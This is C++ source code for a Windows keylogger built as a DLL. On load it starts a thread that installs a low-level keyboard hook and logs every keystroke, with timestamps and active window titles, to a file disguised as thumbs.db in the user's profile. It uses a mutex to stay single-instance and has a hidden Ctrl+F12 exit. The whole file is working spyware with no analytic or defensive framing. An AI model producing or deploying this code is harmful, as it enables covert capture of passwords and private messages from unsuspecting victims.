#define _CRT_SECURE_NO_DEPRECATE

#include <Windows.h>
#include <fstream>
#include <tlhelp32.h>
#include <UserEnv.h>
#include <Wtsapi32.h>
#include <time.h>

#define OutputFile "%userprofile%\\thumbs.db"
#define ExitKey VK_F12         // Will exit keylogger when combined with Ctrl
#define MutexName "klsvc"      // Keeps only one instance of the keylogger alive at a time


HHOOK KeyboardHook;
char outputFile[MAX_PATH] = "";
bool shift = false;
HWND oldWindow = NULL;
char cWindow[MAX_PATH];
HANDLE ghMutex = NULL;

BOOLEAN DoesMutexExist()
{
	ghMutex = CreateMutex(NULL, false, MutexName);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;

	return FALSE;
}

void FileWrite(const char *c)
{
	FILE *f = fopen(outputFile, "a+");
	if(f != NULL)
	{
		fputs(c, f); 
		fclose(f);
	}
}

void KeepAlive()
{
    MSG message;
    while(GetMessage(&message, NULL, 0, 0))
    {
		TranslateMessage(&message);
		DispatchMessage(&message);
    }
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	bool caps = GetKeyState(VK_CAPITAL) < 0;

    KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
	if(nCode == HC_ACTION)
	{
		// Handle shift keys
		if(p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT){
			if(wParam == WM_KEYDOWN)
				shift = true;
			else
				shift = false;
		}
		

		int bControlKeyDown = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
		if (p->vkCode == ExitKey && bControlKeyDown) 
		{
			UnhookWindowsHookEx(KeyboardHook);
		}

		if(wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) 
		{
			HWND newWindow = GetForegroundWindow();
			if(oldWindow == NULL || newWindow != oldWindow)
			{

				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));

				time_t theTime = time(NULL);
				struct tm *aTime = localtime(&theTime);

				int day = aTime->tm_mday;
				int month = aTime->tm_mon + 1; // Month is 0 - 11, add 1 to get a jan-dec 1-12 concept
				int year = aTime->tm_year + 1900; // Year is # years since 1900
				int hour = aTime->tm_hour;
				int minutes = aTime->tm_min;

				char td[50] = {0};
				sprintf(td, "\n\n[+] %d/%d/%d %d:%02d", day, month, year, hour, minutes); 

				FileWrite(td);
				FileWrite(" - Active Window: ");
				FileWrite(cWindow);
				FileWrite("\n");
				oldWindow = newWindow;
			}
			// Virtual Key Codes reference: http://msdn.microsoft.com/en-us/library/dd375731%28v=VS.85%29.aspx
			switch(p->vkCode)
			{
				case 0x30: FileWrite(shift?")":"0");break;
				case 0x31: FileWrite(shift?"!":"1");break;
				case 0x32: FileWrite(shift?"@":"2");break;
				case 0x33: FileWrite(shift?"#":"3");break;
				case 0x34: FileWrite(shift?"$":"4");break;
				case 0x35: FileWrite(shift?"%":"5");break;
				case 0x36: FileWrite(shift?"^":"6");break;
				case 0x37: FileWrite(shift?"&":"7");break;
				case 0x38: FileWrite(shift?"*":"8");break;
				case 0x39: FileWrite(shift?"(":"9");break;

				case 0x60: FileWrite("0");break;
				case 0x61: FileWrite("1");break;
				case 0x62: FileWrite("2");break;
				case 0x63: FileWrite("3");break;
				case 0x64: FileWrite("4");break;
				case 0x65: FileWrite("5");break;
				case 0x66: FileWrite("6");break;
				case 0x67: FileWrite("7");break;
				case 0x68: FileWrite("8");break;
				case 0x69: FileWrite("9");break;

				case 0x41: FileWrite(caps?(shift?"a":"A"):(shift?"A":"a"));break;
				case 0x42: FileWrite(caps?(shift?"b":"B"):(shift?"B":"b"));break;
				case 0x43: FileWrite(caps?(shift?"c":"C"):(shift?"C":"c"));break;
				case 0x44: FileWrite(caps?(shift?"d":"D"):(shift?"D":"d"));break;
				case 0x45: FileWrite(caps?(shift?"e":"E"):(shift?"E":"e"));break;
				case 0x46: FileWrite(caps?(shift?"f":"F"):(shift?"F":"f"));break;
				case 0x47: FileWrite(caps?(shift?"g":"G"):(shift?"G":"g"));break;
				case 0x48: FileWrite(caps?(shift?"h":"H"):(shift?"H":"h"));break;
				case 0x49: FileWrite(caps?(shift?"i":"I"):(shift?"I":"i"));break;
				case 0x4A: FileWrite(caps?(shift?"j":"J"):(shift?"J":"j"));break;
				case 0x4B: FileWrite(caps?(shift?"k":"K"):(shift?"K":"k"));break;
				case 0x4C: FileWrite(caps?(shift?"l":"L"):(shift?"L":"l"));break;
				case 0x4D: FileWrite(caps?(shift?"m":"M"):(shift?"M":"m"));break;
				case 0x4E: FileWrite(caps?(shift?"n":"N"):(shift?"N":"n"));break;
				case 0x4F: FileWrite(caps?(shift?"o":"O"):(shift?"O":"o"));break;
				case 0x50: FileWrite(caps?(shift?"p":"P"):(shift?"P":"p"));break;
				case 0x51: FileWrite(caps?(shift?"q":"Q"):(shift?"Q":"q"));break;
				case 0x52: FileWrite(caps?(shift?"r":"R"):(shift?"R":"r"));break;
				case 0x53: FileWrite(caps?(shift?"s":"S"):(shift?"S":"s"));break;
				case 0x54: FileWrite(caps?(shift?"t":"T"):(shift?"T":"t"));break;
				case 0x55: FileWrite(caps?(shift?"u":"U"):(shift?"U":"u"));break;
				case 0x56: FileWrite(caps?(shift?"v":"V"):(shift?"V":"v"));break;
				case 0x57: FileWrite(caps?(shift?"w":"W"):(shift?"W":"w"));break;
				case 0x58: FileWrite(caps?(shift?"x":"X"):(shift?"X":"x"));break;
				case 0x59: FileWrite(caps?(shift?"y":"Y"):(shift?"Y":"y"));break;
				case 0x5A: FileWrite(caps?(shift?"z":"Z"):(shift?"Z":"z"));break;

				case VK_SPACE: FileWrite(" "); break;
				case VK_RETURN: FileWrite("\n"); break;
				case VK_TAB: FileWrite("\t"); break;
				case VK_ESCAPE: FileWrite("[ESC]"); break;
				case VK_LEFT: FileWrite("[LEFT]"); break;
				case VK_RIGHT: FileWrite("[RIGHT]"); break;
				case VK_UP: FileWrite("[UP]"); break;
				case VK_DOWN: FileWrite("[DOWN]"); break;
				case VK_END: FileWrite("[END]"); break;
				case VK_HOME: FileWrite("[HOME]"); break;
				case VK_DELETE: FileWrite("[DELETE]"); break;
				case VK_BACK: FileWrite("[BACKSPACE]"); break;
				case VK_INSERT: FileWrite("[INSERT]"); break;
				case VK_LCONTROL: FileWrite("[CTRL]"); break;
				case VK_RCONTROL: FileWrite("[CTRL]"); break;
				case VK_LMENU: FileWrite("[ALT]"); break;
				case VK_RMENU: FileWrite("[ALT]"); break;
				case VK_F1: FileWrite("[F1]");break;
				case VK_F2: FileWrite("[F2]");break;
				case VK_F3: FileWrite("[F3]");break;
				case VK_F4: FileWrite("[F4]");break;
				case VK_F5: FileWrite("[F5]");break;
				case VK_F6: FileWrite("[F6]");break;
				case VK_F7: FileWrite("[F7]");break;
				case VK_F8: FileWrite("[F8]");break;
				case VK_F9: FileWrite("[F9]");break;
				case VK_F10: FileWrite("[F10]");break;
				case VK_F11: FileWrite("[F11]");break;
				case VK_F12: FileWrite("[F12]");break;

				case VK_LSHIFT: break;
				case VK_RSHIFT: break;

				case VK_OEM_1: FileWrite(shift?":":";");break;
				case VK_OEM_2: FileWrite(shift?"?":"/");break;
				case VK_OEM_3: FileWrite(shift?"~":"`");break;
				case VK_OEM_4: FileWrite(shift?"{":"[");break;
				case VK_OEM_5: FileWrite(shift?"|":"\\");break;
				case VK_OEM_6: FileWrite(shift?"}":"]");break;
				case VK_OEM_7: FileWrite(shift?"\"":"'");break;
				case VK_OEM_PLUS: FileWrite(shift?"+":"=");break;
				case VK_OEM_COMMA: FileWrite(shift?"<":",");break;
				case VK_OEM_MINUS: FileWrite(shift?+"_":"-");break;
				case VK_OEM_PERIOD: FileWrite(shift?">":".");break;
				default: 
					DWORD dwMsg = p->scanCode << 16;
                        dwMsg += p->flags << 24;
                        char key[16];
                        GetKeyNameText(dwMsg, key, 15);
						FileWrite(key);
						break;
			}
		}
	}

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


DWORD WINAPI StartKeylogger(LPVOID lpParam)
{
	if (DoesMutexExist())
		return 0;

    KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, GetModuleHandle(NULL), NULL);

	ExpandEnvironmentStringsA(OutputFile, outputFile, MAX_PATH);

	if(KeyboardHook != NULL)
		KeepAlive();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	HANDLE hThread;
	DWORD threadID;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hThread = CreateThread(NULL, 0, StartKeylogger, NULL, 0, &threadID);

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
